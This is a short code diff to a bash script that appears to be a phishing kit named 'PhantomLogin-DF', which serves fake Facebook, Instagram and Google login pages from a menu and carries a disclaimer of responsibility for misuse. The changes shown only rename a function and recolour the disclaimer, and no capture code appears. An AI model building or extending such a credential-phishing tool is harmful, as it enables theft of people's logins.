@@ -126,7 +126,7 @@ facebook_page() {
 EOF
 }
 
-instagram_page() {
+Instagram_page() {
     cat <<EOF
 <!DOCTYPE html>
 <html lang="en">
@@ -943,7 +943,7 @@ display_logs() {
 }
 show_menu() {
     echo -e "${GREEN}Welcome to PhantomLogin-DF... ${NC}"
-    echo -e "${GREEN}The developer is not responsible for any incorrect use of the tool... ${NC}"
+    echo -e "${RED}The developer is not responsible for any incorrect use of the tool... ${NC}"
     echo -e "${GREEN}All rights reserved:Mohamed Abu Al-Saud ${NC}"
     echo -e "${YELLOW}=================================${NC}"
     echo -e "${BLUE}[1] Facebook login${NC}"
@@ -975,7 +975,7 @@ case $choice in
         ;;
     2)
         page="Instagram_login"
-        create_page "$page" "$(instagram_page)"
+        create_page "$page" "$(Instagram_page)"
         ;;
     3)
         page="Google_login"
